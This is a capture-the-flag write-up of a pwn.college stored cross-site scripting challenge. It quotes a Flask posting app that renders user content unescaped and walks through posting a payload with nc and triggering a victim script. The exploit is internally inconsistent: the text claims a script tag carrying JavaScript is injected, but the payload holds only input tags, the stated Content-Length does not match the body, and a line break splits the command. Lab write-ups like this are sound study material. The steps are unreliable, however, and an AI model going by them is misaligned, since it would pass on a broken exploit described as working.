---
layout: page
title: "🛡️ Web — XSS1 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 📜 Challenge Overview

We are given a Flask-based web app running on `challenge.localhost:80`. The app allows anonymous posting using a form, and displays submitted posts. There's a `/` route handling both `GET` and `POST` requests.

Here’s the relevant part of the server source:

```python
@app.route("/", methods=["POST"])
def challenge_post():
    content = flask.request.form.get("content", "")
    db.execute("INSERT INTO posts VALUES (?)", [content])
    return flask.redirect(flask.request.path)


@app.route("/", methods=["GET"])
def challenge_get():
    page = "<html><body>\nWelcome to pwnpost, the anonymous posting service. Post away!\n"
    page += "<form method=post>Post:<input type=text name=content><input type=submit value=Submit></form>\n"

    for post in db.execute("SELECT content FROM posts").fetchall():
        page += "<hr>" + post["content"] + "\n"

    return page + "</body></html>"
```
The content from the form is directly inserted into the page without any sanitization — this is a classic Stored XSS vulnerability.

---

## Exploitation Steps

### 1.Craft a malicious payload
Inject a `<script>` tag so that when the victim visits /, it gets executed.

### 2.Send POST request with payload
Use nc to simulate a browser POST request:

```bash
printf 'POST / HTTP/1.0\r\nHost:challenge.localhost\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:40\r\n\r\ncontent=<input type="text">
;<input type="text">;<input type="text">' | nc challenge.localhost 80
```
This inserts the malicious JavaScript into the database.

### 3.Trigger victim to visit
Now simulate the victim visiting the site:
```bash
/challenge/victim
```
The victim browser will execute the injected `<script>`.

---

## Flag
After executing the above steps, the victim script will trigger, and the flag will be printed in the terminal running the challenge service.
Run the victim binary like this:
```bash
/challenge/victim
```

Then the flag will be revealed if the XSS was successful.
```
pwn.college{example_flag_value}
```

---

